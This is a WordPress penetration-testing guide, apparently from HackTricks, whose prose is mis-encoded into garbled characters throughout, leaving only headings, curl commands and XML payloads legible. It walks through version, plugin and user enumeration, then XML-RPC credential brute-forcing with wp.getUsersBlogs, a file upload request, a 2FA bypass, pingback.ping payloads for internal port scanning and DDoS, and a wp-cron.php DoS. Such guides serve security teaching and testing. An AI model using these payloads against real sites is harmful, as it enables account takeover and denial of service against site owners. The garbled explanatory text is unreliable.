# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдереАрдо рдХреЗ рдХреБрдЫ php рдХреЛ рдмрджрд▓рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рд╢рд╛рдпрдж рдЙрд╕ рдкрде рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: **рдереАрдо twentytwelve** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдЖрдк **404.php** рдлрд╝рд╛рдЗрд▓ рддрдХ **рдкрд╣реБрдБрдЪ** рд╕рдХрддреЗ рд╣реИрдВ: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **рдПрдХ рдФрд░ рдЙрдкрдпреЛрдЧреА рдпреВрдЖрд░рдПрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **wp-config.php** рдореЗрдВ рдЖрдк рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ рд░реВрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
- рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд▓реЙрдЧрд┐рди рдкрде: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` рдореЗрдВ рдЙрдкрдпреЛрдЧреА рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИ рдЬреИрд╕реЗ рдХрд┐ рд╕реНрдерд╛рдкрд┐рдд WordPress рдХрд╛ рд╕рдВрд╕реНрдХрд░рдгред
- `wp-activate.php` рдирдП WordPress рд╕рд╛рдЗрдЯ рд╕реЗрдЯрдЕрдк рдХрд░рддреЗ рд╕рдордп рдИрдореЗрд▓ рд╕рдХреНрд░рд┐рдпрдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- рд▓реЙрдЧрд┐рди рдлрд╝реЛрд▓реНрдбрд░ (рдЫрд┐рдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╛рдо рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` рдПрдХ рдлрд╝рд╛рдЗрд▓ рд╣реИ рдЬреЛ WordPress рдХреА рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддреА рд╣реИ рдЬреЛ рдбреЗрдЯрд╛ рдХреЛ HTTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрдЪрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬреЛ рдкрд░рд┐рд╡рд╣рди рддрдВрддреНрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддреА рд╣реИ рдФрд░ XML рдХреЛ рдПрдиреНрдХреЛрдбрд┐рдВрдЧ рддрдВрддреНрд░ рдХреЗ рд░реВрдк рдореЗрдВред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рд╕рдВрдЪрд╛рд░ рдХреЛ WordPress [REST API](https://developer.wordpress.org/rest-api/reference) рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
- `wp-content` рдлрд╝реЛрд▓реНрдбрд░ рдореБрдЦреНрдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ рдЬрд╣рд╛рдБ рдкреНрд▓рдЧрдЗрдиреНрд╕ рдФрд░ рдереАрдо рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВред
- `wp-content/uploads/` рд╡рд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ рдЬрд╣рд╛рдБ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдкрд░ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдХреЛрдИ рднреА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИрдВред
- `wp-includes/` рдпрд╣ рд╡рд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ рдЬрд╣рд╛рдБ рдХреЛрд░ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдкреНрд░рдорд╛рдгрдкрддреНрд░, рдлрд╝реЙрдиреНрдЯ, рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдлрд╝рд╛рдЗрд▓реЗрдВ, рдФрд░ рд╡рд┐рдЬреЗрдЯред
- `wp-sitemap.xml` WordPress рд╕рдВрд╕реНрдХрд░рдг 5.5 рдФрд░ рдЙрд╕рд╕реЗ рдЕрдзрд┐рдХ рдореЗрдВ, WordPress рд╕рднреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдкреЛрд╕реНрдЯ рдФрд░ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдХреНрд╡реЗрд░реА рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдкреЛрд╕реНрдЯ рдкреНрд░рдХрд╛рд░реЛрдВ рдФрд░ рд╡рд░реНрдЧреАрдХрд░рдгреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╕рд╛рдЗрдЯрдореИрдк XML рдлрд╝рд╛рдЗрд▓ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИред

**Post exploitation**

- `wp-config.php` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ WordPress рдХреЛ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИ рдЬреИрд╕реЗ рдХрд┐ рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ рдирд╛рдо, рдбреЗрдЯрд╛рдмреЗрд╕ рд╣реЛрд╕реНрдЯ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб, рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреБрдВрдЬреА рдФрд░ рдирдордХ, рдФрд░ рдбреЗрдЯрд╛рдмреЗрд╕ рддрд╛рд▓рд┐рдХрд╛ рдЙрдкрд╕рд░реНрдЧред рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ DEBUG рдореЛрдб рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╕рдорд╕реНрдпрд╛ рдирд┐рд╡рд╛рд░рдг рдореЗрдВ рд╕рд╣рд╛рдпрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### Users Permissions

- **Administrator**
- **Editor**: рдЕрдкрдиреЗ рдФрд░ рджреВрд╕рд░реЛрдВ рдХреЗ рдкреЛрд╕реНрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ
- **Author**: рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдкреЛрд╕реНрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ
- **Contributor**: рдЕрдкрдиреЗ рдкреЛрд╕реНрдЯ рд▓рд┐рдЦрддрд╛ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдЙрдиреНрд╣реЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛
- **Subscriber**: рдкреЛрд╕реНрдЯ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдкрдиреЗ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ

## **Passive Enumeration**

### **Get WordPress version**

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдлрд╝рд╛рдЗрд▓реЗрдВ `/license.txt` рдпрд╛ `/readme.html` рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ

рдкреГрд╖реНрда рдХреЗ **рд╕реНрд░реЛрдд рдХреЛрдб** рдХреЗ рдЕрдВрджрд░ (рдЙрджрд╛рд╣рд░рдг [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/) рд╕реЗ):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS рд▓рд┐рдВрдХ рдлрд╝рд╛рдЗрд▓реЗрдВ

![](<../../images/image (533).png>)

- JavaScript рдлрд╝рд╛рдЗрд▓реЗрдВ

![](<../../images/image (524).png>)

### рдкреНрд▓рдЧрдЗрдиреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### рдереАрдо рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рд╕рдВрд╕реНрдХрд░рдг рдирд┐рдХрд╛рд▓реЗрдВ
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## рд╕рдХреНрд░рд┐рдп рд╕реВрдЪреАрдХрд░рдг

### рдкреНрд▓рдЧрдЗрдиреНрд╕ рдФрд░ рдереАрдо

рдЖрдк рд╢рд╛рдпрдж рд╕рднреА рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд▓рдЧрдЗрдиреНрд╕ рдФрд░ рдереАрдо рдирд╣реАрдВ рдвреВрдВрдв рдкрд╛рдПрдВрдЧреЗред рд╕рднреА рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ **рдкреНрд▓рдЧрдЗрдиреНрд╕ рдФрд░ рдереАрдо рдХреА рд╕реВрдЪреА рдкрд░ рд╕рдХреНрд░рд┐рдп рд░реВрдк рд╕реЗ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛** (рд╣рдорд╛рд░реЗ рд▓рд┐рдП рдЙрдореНрдореАрдж рд╣реИ рдХрд┐ рдРрд╕реЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг рд╣реИрдВ рдЬреЛ рдЗрди рд╕реВрдЪрд┐рдпреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреЗ рд╣реИрдВ)ред

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛

- **рдЖрдИрдбреА рдмреНрд░реВрдЯ:** рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА рдХреЛ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд░рдХреЗ рдПрдХ рд╡рд░реНрдбрдкреНрд░реЗрд╕ рд╕рд╛рдЗрдЯ рд╕реЗ рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
рдпрджрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ **200** рдпрд╛ **30X** рд╣реИрдВ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдИрдбреА **рдорд╛рдиреНрдп** рд╣реИред рдпрджрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ **400** рд╣реИ, рддреЛ рдЖрдИрдбреА **рдЕрдорд╛рдиреНрдп** рд╣реИред

- **wp-json:** рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХреНрд╡реЗрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
рдПрдХ рдФрд░ `/wp-json/` рдПрдВрдбрдкреЙрдЗрдВрдЯ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреБрдЫ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рд╡рд╣ рд╣реИ:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗрд╡рд▓ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ рдПрдХ рдкреЛрд╕реНрдЯ рдмрдирд╛рдИ рд╣реИред **рдХреЗрд╡рд▓ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рдПрдЧреА рдЬрд┐рдирдХреЗ рдкрд╛рд╕ рдпрд╣ рд╕реБрд╡рд┐рдзрд╛ рд╕рдХреНрд╖рдо рд╣реИ**ред

рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **/wp-json/wp/v2/pages** рдЖрдИрдкреА рдкрддреЗ рд▓реАрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

- **рд▓реЙрдЧрд┐рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдЧрдгрдирд╛**: рдЬрдм **`/wp-login.php`** рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рддреЗ рд╣реИрдВ рддреЛ **рд╕рдВрджреЗрд╢** **рд╡рд┐рднрд┐рдиреНрди** рд╣реЛрддрд╛ рд╣реИ рдпрджрд┐ рдирд┐рд░реНрджрд┐рд╖реНрдЯ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдореМрдЬреВрдж рд╣реИ рдпрд╛ рдирд╣реАрдВ**ред

### XML-RPC

рдпрджрд┐ `xml-rpc.php` рд╕рдХреНрд░рд┐рдп рд╣реИ рддреЛ рдЖрдк рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдиреНрдп рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдкрд░ DoS рд╣рдорд▓реЗ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред (рдЖрдк рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ[ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ](https://github.com/relarizky/wpxploit) рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП)ред

рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдпрд╣ рд╕рдХреНрд░рд┐рдп рд╣реИ, _**/xmlrpc.php**_ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдпрд╣ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ:

**рдЬрд╛рдВрдЪреЗрдВ**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕**

**`wp.getUserBlogs`**, **`wp.getCategories`** рдпрд╛ **`metaWeblog.getUsersBlogs`** рдХреБрдЫ рдРрд╕реЗ рддрд░реАрдХреЗ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдЖрдк рдЗрдирдореЗрдВ рд╕реЗ рдХреЛрдИ рднреА рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
рд╕рдВрджреЗрд╢ _"Incorrect username or password"_ рдПрдХ 200 рдХреЛрдб рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдВрджрд░ рддрдм рджрд┐рдЦрд╛рдИ рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрдм рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реЛрддреЗред

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

рд╕рд╣реА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдкрде рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **`system.multicall`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ **рддреЗрдЬрд╝ рддрд░реАрдХрд╛** рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдПрдХ рд╣реА рдЕрдиреБрд░реЛрдз рдкрд░ рдХрдИ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**2FA рдмрд╛рдпрдкрд╛рд╕ рдХрд░реЗрдВ**

рдпрд╣ рд╡рд┐рдзрд┐ рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреЗ рд▓рд┐рдП рд╣реИ рдФрд░ рдордиреБрд╖реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ, рдФрд░ рдкреБрд░рд╛рдиреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ 2FA рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддреА рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдорд╛рдиреНрдп рдХреНрд░реЗрдбреНрд╕ рд╣реИрдВ рд▓реЗрдХрд┐рди рдореБрдЦреНрдп рдкреНрд░рд╡реЗрд╢ 2FA рджреНрд╡рд╛рд░рд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рддреЛ **рдЖрдк xmlrpc.php рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрди рдХреНрд░реЗрдбреНрд╕ рдХреЗ рд╕рд╛рде 2FA рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк рдХрдВрд╕реЛрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдЖрдк рдЕрднреА рднреА RCE рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕рд╛ рдХрд┐ Ippsec рдЗрд╕реЗ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) рдореЗрдВ рд╕рдордЭрд╛рддрд╛ рд╣реИред

**DDoS рдпрд╛ рдкреЛрд░реНрдЯ рд╕реНрдХреИрдирд┐рдВрдЧ**

рдпрджрд┐ рдЖрдк рд╕реВрдЪреА рдореЗрдВ _**pingback.ping**_ рд╡рд┐рдзрд┐ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк Wordpress рдХреЛ рдХрд┐рд╕реА рднреА рд╣реЛрд╕реНрдЯ/рдкреЛрд░реНрдЯ рдкрд░ рдордирдорд╛рдирд╛ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рд╣рдЬрд╛рд░реЛрдВ** Wordpress **рд╕рд╛рдЗрдЯреЛрдВ** рд╕реЗ **рдПрдХ рд╕реНрдерд╛рди** (рддреЛ рдЙрд╕ рд╕реНрдерд╛рди рдкрд░ **DDoS** рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ) рддрдХ **рдкрд╣реБрдБрдЪрдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **Wordpress** рдХреЛ рдХреБрдЫ рдЖрдВрддрд░рд┐рдХ **рдиреЗрдЯрд╡рд░реНрдХ** рдХреЛ **рд╕реНрдХреИрди** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЖрдк рдХрд┐рд╕реА рднреА рдкреЛрд░реНрдЯ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

рдпрджрд┐ рдЖрдкрдХреЛ **faultCode** рдПрдХ рдорд╛рди **greater** рдлрд┐рд░ **0** (17) рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИред

DDoS рдХрд╛ рдХрд╛рд░рдг рдмрдирдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рд╡рд┐рдзрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ, рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ **`system.multicall`** рдХреЗ рдЙрдкрдпреЛрдЧ рдкрд░ рдПрдХ рдирдЬрд╝рд░ рдбрд╛рд▓реЗрдВред

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдЖрдорддреМрд░ рдкрд░ Wordpress рд╕рд╛рдЗрдЯ рдХреА рдЬрдбрд╝ рдХреЗ рддрд╣рдд рдореМрдЬреВрдж рд╣реЛрддреА рд╣реИ: **`/wp-cron.php`**\
рдЬрдм рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдПрдХреНрд╕реЗрд╕** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдПрдХ "**рднрд╛рд░реА**" MySQL **рдХреНрд╡реЗрд░реА** рдХреА рдЬрд╛рддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ **рд╣рдорд▓рд╛рд╡рд░реЛрдВ** рджреНрд╡рд╛рд░рд╛ **DoS** **рдХрд╛рд░рдг** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
